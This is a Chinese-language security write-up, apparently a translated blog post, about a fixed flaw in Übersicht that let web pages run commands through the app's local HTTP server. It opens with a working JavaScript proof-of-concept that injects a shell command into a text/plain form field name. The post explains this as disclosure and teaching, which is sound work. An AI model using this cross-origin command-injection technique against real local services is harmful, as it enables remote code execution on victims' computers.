可以，只要用一点点小的黑客技术，一些JavaScript代码，poc代码是这样的：
    const [form, input] = ["form", "input"].map(document.createElement.bind(document));
    Object.entries({
      method: "POST",
      action: "http://127.0.0.1:41416/run/",
      enctype: "text/plain"
    }).forEach(([key, value]) => form.setAttribute(key, value))
    Object.entries({
      value: "nope",
      name: "open /Applications/Calculator.app #"
    }).forEach(([key, value]) => input.setAttribute(key, value))
    document.body.appendChild(form).appendChild(input);
    form.submit();
首先，我很抱歉的是我用的是ES6 JavaScript，这对于JavaScript程序员来说就像用老式英语跟英国人说话一样  
我做了一个简单的html表单，代码就像下面这样，这应该很容易去理解
你看到这些的时候就会想到'哇，真的就可以用这么简单的代码搞定Übersicht’？对的，记得吗？我提到这个网站，这个网站可以通过“几个极其技术性和复杂性的警告”向对方发出请求。这是这些警告的产物
如果你能接受，喝一杯茶，我们继续讲这样的技术
网页能发送请求而不用经过你的同意，这是古老技术的产物。这种技术会一直流传下去
一个web（HTTP）请求是一个非常简单的东西。两个人可以用http请求的方式进行通信，因为HTTP请求发送的其实就是文本数据。  
我们只关注''之后的内容就可以了，这些是发送或者接受到的内容
    $ curl -sv 'http://oh.no.ms' | head
    > GET / HTTP/1.1
    > Host: oh.no.ms
    > User-Agent: curl/7.58.0
    > Accept: */*
    >
第一行的内容是是告诉我们‘通过HTTP 1.1给我们一个资源/’。在前面我们看到了‘/run’
，‘/’会被重定向到‘/run’。我们通过调用‘header’指令来把数据进行格式化，这样我们就可以很方便的寻找到其中有用的信息了。上面的请求还说，我们请求的网站是‘oh.no.ms’，我们可以用'浏览器'发送cURL，之后我们接收到返回数据。
然后web服务器说’ok‘。我有这个，这是格式化好的数据还有最终的返回报文数据。请注意这一点。我们提到了三个部分：请求（头），返回（头），还有返回体（任何东西）
请求报文也会有请求体。实际上，我们像Übersicht发送POST请求时，我们就会有请求体，像这样：
    curl 'http://oh.no.ms' -vvs -X POST -d 'param1=cool beans&param2=cooler beans' | h
    ead
    * Rebuilt URL to: http://oh.no.ms/
    *   Trying 52.218.80.156...
    * TCP_NODELAY set
    * Connected to oh.no.ms (52.218.80.156) port 80 (#0)
    > POST / HTTP/1.1
    > Host: oh.no.ms
    > User-Agent: curl/7.58.0
    > Accept: */*
    > Content-Length: 37
    > Content-Type: application/x-www-form-urlencoded
    >
    > param1=cool%20beans&param2=cooler%20beans
任何网页都可以发送这样的老式请求，当你用JavaScript代码发送请求时，它会被带上额外的保护和能力。其中一个是自定义请求体，这个可以是任何数据。在这个例子中，Übersicht就会用到这样的代码。命令是通过http请求体来发送的。
html表单很难去构造这样的数据包，因为html格式总是通过标准格式发送数据。让我们尝试一下，例如：
http请求体就像下面这样：  
当你发送这样的时候，Übersicht不会有任何反应，因为没有程序会调用‘run=open+%2FApplications%2FCalculator.app’，我们需要其他的方式：
首先，我们指定`enctype="text/plain"`,这表明，我们不希望用url编码，其次，我们把要执行的命令作为‘name’,并以‘#’
作为结尾。在shell中， ‘#’ 是注释的意思，之后的东西都会被忽略。所以我们发送open /Applications/Calculator.app
#=nope  
太棒啦，这是有效的shell指令，它打开了计算器  
我的意思是，很明显，如果这不是一个poc，我会运行其他的代码
# III 总结
几个月之前Übersicht就已经修复这个问题了。怎么修复的?就是验证了请求的[来源](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin)。这种修复方式这是奇怪。添加这个目的是避免浏览器和本地程序产生数据交换，我们要测试多种方式，并告诉他们这样是不行的。
在传统观念中，我们认为防火墙可以有效的把我们分隔开来，阻止其他人来访问自己。2018年了，这并不是一个孤例。你可能在家用防火墙后面，你的计算机里面也有防火墙，并且你只暴露自己的本地服务，我还有有可能通过远程的方式把你攻陷的。
事实就是如此，每一个web客户端已经成为一个完整的网络工具了，它可以发送各种请求。想想那些小的科技公司，它们可能有一个办公区，员工需要通过登录特定的WiFi去访问特定的服务，例如：payroll，数据库或者其他的系统。
如果你发送一个恶意的网址，或者仅仅构造恶意的请求表单内容，然后发给一个员工，我的web
app已被限制访问（包含‘特殊复杂的警告’），目的是为了向所有这些服务发出请求，不仅如此，如果用户的会话保存在cookie中，我就能以这个用户的身份来发出请求。我就会变成他。
但是现在没有这样的限制！听到这些你会害怕没有网络限制的web服务。我能发送请求给任何服务，用任何协议，并且只要不阻塞我发送的http请求，我能执行任何命令。
在2018年，应用安全会变的越来越重要。